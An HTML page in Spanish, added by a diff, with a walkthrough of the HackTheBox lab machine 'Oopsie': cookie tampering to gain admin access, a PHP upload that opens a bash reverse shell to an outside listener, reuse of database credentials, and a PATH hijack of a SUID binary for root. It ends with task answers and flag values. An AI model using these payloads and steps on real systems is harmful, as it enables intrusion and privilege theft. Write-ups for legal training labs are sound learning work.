@@ -1,0 +1,317 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Oopsie HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/oopsie.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Oopsie HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Oopsie de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Oopsie de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Oopsie HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Oopsie HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Oopsie de la plataforma de HackTheBox","headline":"Writeup Oopsie HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Oopsie HackTheBox</h1>
+          <p>Resolución de la máquina Oopsie de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.62.42
+Nmap scan report for 10.129.62.42
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http</span>
+</code></pre></div></div>
+
+<div><p>En la web principal de primeras no vemos mucho realmente</p></div>
+<a href="./1.png" target="_blank"><div><p><img src="./1.png"><p></div></a>
+
+<div><p>Si pasamos la petición por burpsuite en la pestaña target podemos ver un directorio /cdn-cgi/login</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Abrimos ese directorio y podemos ver un login, que por cierto nos permite ingresar como guest</p></div>
+<a href="./3.png" target="_blank"><div><p><img src="./3.png"><p></div></a>
+
+<div><p>Al entrar como guest podemos ver que las cookies se gestionan con un id y con un role</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>En la página principal podemos ver una pestaña Uploads donde tal vez podeamos subir archivos</p></div>
+<a href="./5.png" target="_blank"><div><p><img src="./5.png"><p></div></a>
+
+<div><p>El ingresar a ella podemos ver que necesitamos obtener acceso como Administrador</p></div>
+<div><p><img src="./9.png"><p></div>
+
+<div><p>También encontramos una pestaña Account donde podriamos encontrar un poco de información</p></div>
+
+<div><p>En la url se genera con id= y el nuestro es el 2, podemos ver nuestro id y nuestro nombre</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">http://10.129.62.42/cdn-cgi/login/admin.php?content=accounts&id=2</span>
+</code></pre></div></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Podemos cambiar el id a 1 y nos muestra el id y el nombre de el usuario admin</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">http://10.129.62.42/cdn-cgi/login/admin.php?content=accounts&id=1</span>
+</code></pre></div></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Modificamos nuestro identificador a 34322 y el role a admin para usar su sesión</p></div>
+<div><p><img src="./8.png"><p></div>
+
+<div><p>Ahora como admin podemos acceder a la pestaña uploads sin restricciones</p></div>
+<div><p><img src="./10.png"><p></div>
+
+<div><p>Podemos subir un archivo php como el siguiente que nos envie una reverse shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    </span><span class="k">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"</span><span class="p">)
+?></span>
+</code></pre></div></div>
+<div><p><img src="./11.png"><p></div>
+
+<div><p>Subimos el archivo y nos dice que se ha subido, muy bien pero ¿donde lo ha subido?</p></div>
+<div><p><img src="./12.png"><p></div>
+
+<div><p>Podemos usar wfuzz para conseguir posibles rutas y encontramos el directorio /uploads</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.62.42/FUZZ -t 100 --hc 404
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.129.62.42/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000002:   </span><span class="na">301</span><span class="p">        9 L      28 W       313 Ch      "images" 
+000000015:   </span><span class="na">301</span><span class="p">        9 L      28 W       310 Ch      "css"    
+000000276:   </span><span class="na">301</span><span class="p">        9 L      28 W       312 Ch      "fonts"  
+000000009:   </span><span class="na">301</span><span class="p">        9 L      28 W       309 Ch      "js"     
+000000024:   </span><span class="na">301</span><span class="p">        9 L      28 W       313 Ch      "themes" 
+000000070:   </span><span class="na">301</span><span class="p">        9 L      28 W       314 Ch      "uploads"</span>
+</code></pre></div></div>
+
+<div><p>Llamamos a nuestro archivo shell.php desde el directorio uploads y recibimos una shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> http://10.129.62.42/uploads/shell.php
+</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.62.42
+</span><span class="s2">www-data@oopsie</span><span class="p">:</span><span class="na">~/html/uploads</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@oopsie</span><span class="p">:</span><span class="na">~/html/uploads</span><span class="p">$ hostname -I
+10.129.62.42 dead:beef::250:56ff:feb9:d514 
+</span><span class="s2">www-data@oopsie</span><span class="p">:</span><span class="na">~/html/uploads</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En el directorio /var/www/html/cdn-cgi/login podemos ver un archivo db.php con credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@oopsie</span><span class="p">:</span><span class="na">~/html/cdn-cgi/login</span><span class="p">$ cat db.php 
+&lt?php
+$conn </span><span class="kd">= </span><span class="k">mysqli_connect</span><span class="p">(</span><span class="s2">'localhost'</span><span class="p">,</span><span class="s2">'robert'</span><span class="p">,</span><span class="s2">'M3g4C0rpUs3r!'</span><span class="p">,</span><span class="s2">'garage'</span><span class="p">);
+?>
+</span><span class="s2">www-data@oopsie</span><span class="p">:</span><span class="na">~/html/cdn-cgi/login</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Son para la db pero podemos reutilizarlas para acceder como el usuario robert con su</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ su robert 
+Password: </span><span class="kd">M3g4C0rpUs3r!
+</span><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+</span><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.129.62.42 dead:beef::250:56ff:feb9:d514 
+</span><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat ~/user.txt 
+f2c74ee8db7983851ab2a96a44eb7981
+</span><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Buscando binarios suid podemos encontrar uno interesante /usr/bin/bugtracker</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -perm -4000 2>/dev/null
+/bin/fusermount
+/bin/umount
+/bin/mount
+/bin/ping
+/bin/su
+/usr/bin/newuidmap
+/usr/bin/passwd
+/usr/bin/at
+</span><span class="kd">/usr/bin/bugtracker</span><span class="p">
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/sudo
+</span><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>El binario pertenece a root pero nuestro grupo puede ejecutarlo con el uid de root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /usr/bin/bugtracker
+-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 </span><span class="kd">/usr/bin/bugtracker</span><span class="p">
+</span><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo y pasarle un id invalido podemos ver que con cat intenta leer un archivo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: test
+---------------
+
+</span><span class="kd">cat</span><span class="p">: /root/reports/test: No such file or directory
+
+</span><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si quisieramos ver mas a bajo nivel como funciona, podemos pasar el binario y abrirlo con ghidra</p></div>
+<div><p><img src="./13.png"><p></div>
+
+<div><p>En la funcion main podemos ver todo el código decompilado en C</p></div>
+<div><p><img src="./14.png"><p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="k">void </span><span class="kd">main</span><span class="p">(</span><span class="k">void</span><span class="p">)
+
+{
+  __uid_t __uid;
+  </span><span class="k">char </span><span class="kd">*</span><span class="p">__command;
+  </span><span class="k">long </span><span class="p">in_FS_OFFSET;
+  undefined local_28 [</span><span class="na">24</span><span class="p">];
+  </span><span class="k">long </span><span class="p">local_10;
+  
+  local_10 </span><span class="kd">= *</span><span class="p">(</span><span class="k">long</span><span class="kd"> *</span><span class="p">)(in_FS_OFFSET </span><span class="kd">+</span><span class="na"> 0x28</span><span class="p">);
+  </span><span class="k">printf</span><span class="p">(</span><span class="s2">"%s"</span><span class="p">,</span><span class="s2">"\n------------------\n: EV Bug Tracker :\n------------------\n\n"</span><span class="p">);
+  </span><span class="k">printf(</span><span class="s2">"Provide Bug ID: "</span><span class="p">);
+  __isoc99_scanf(&DAT_00100b74,local_28);
+  </span><span class="k">printf</span><span class="p">(</span><span class="s2">"%s"</span><span class="p">,</span><span class="s2">"---------------\n\n"</span><span class="p">);
+  __uid </span><span class="kd">=</span><span class="p"> geteuid();
+  setuid(__uid);
+  __command </span><span class="kd">=</span><span class="p"> (</span><span class="k">char </span><span class="kd">*</span><span class="p">)concat(</span><span class="s2">"cat /root/reports/"</span><span class="p">,local_28);
+  </span><span class="k">system</span><span class="p">(__command);
+  </span><span class="k">putchar</span><span class="p">(</span><span class="na">10</span><span class="p">);
+  </span><span class="kd">if</span><span class="p"> (local_10 </span><span class="kd">!= *</span><span class="p">(</span><span class="k">long </span><span class="kd">*</span><span class="p">)(in_FS_OFFSET </span><span class="kd">+</span><span class="na"> 0x28</span><span class="p">)) {
+</span><span class="c1">                    /* WARNING: Subroutine does not return */</span><span class="p">
+    __stack_chk_fail();
+  }
+  </span><span class="kd">return</span><span class="p">;
+}</span>
+</code></pre></div></div>
+
+<div><p>La vulnerabilidad esta en llamar a cat de forma relativa y no absoluta, podemos secuestrar el path</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">__command </span><span class="kd">=</span><span class="p"> (</span><span class="k">char </span><span class="kd">*</span><span class="p">)concat(</span><span class="s2">"cat /root/reports/"</span><span class="p">,local_28);</span>
+</code></pre></div></div>
+
+<div><p>Creamos un archivo cat que nos de una bash y hacer que el path tome nuestra ruta actual primero</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ echo "bash" > cat
+</span><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ chmod +x cat
+</span><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ export PATH=$PWD:$PATH</span>
+</code></pre></div></div>
+
+<div><p>Ahora al llamar a cat tomara nuestro cat que es bash y obtendremos una bash como root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">robert@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">$ bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: test
+---------------
+
+</span><span class="s2">root@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p"># whoami
+root
+</span><span class="s2">root@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.129.62.42 dead:beef::250:56ff:feb9:d514
+</span><span class="s2">root@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p"># /bin/cat /root/root.txt
+af13b0bee69f8a877c3faf667f7beacf
+</span><span class="s2">root@oopsie</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>With what kind of tool can intercept web traffic?</strong></li>
+<ul><p></p><li>proxy</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the path to the directory on the webserver that returns a login page?</strong></li>
+<ul><p></p><li>/cdn-cgi/login</li></ul></blockquote><br>
+
+<blockquote><li><strong>What can be modified in Firefox to get access to the upload page?</strong></li>
+<ul><p></p><li>cookie</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the access ID of the admin user?</strong></li>
+<ul><p></p><li>34322</li></ul></blockquote><br>
+
+<blockquote><li><strong>On uploading a file, what directory does that file appear in on the server?</strong></li>
+<ul><p></p><li>/uploads</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the file that contains the password that is shared with the robert user?</strong></li>
+<ul><p></p><li>db.php</li></ul></blockquote><br>
+
+<blockquote><li><strong>What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?</strong></li>
+<ul><p></p><li>find</li></ul></blockquote><br>
+
+<blockquote><li><strong>Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?</strong></li>
+<ul><p></p><li>root</li></ul></blockquote><br>
+
+<blockquote><li><strong>What SUID stands for?</strong></li>
+<ul><p></p><li>Set Owner User ID</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the name of the executable being called in an insecure manner?</strong></li>
+<ul><p></p><li>cat</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit user flag</strong></li>
+<ul><p></p><li>f2c74ee8db7983851ab2a96a44eb7981</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>af13b0bee69f8a877c3faf667f7beacf</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
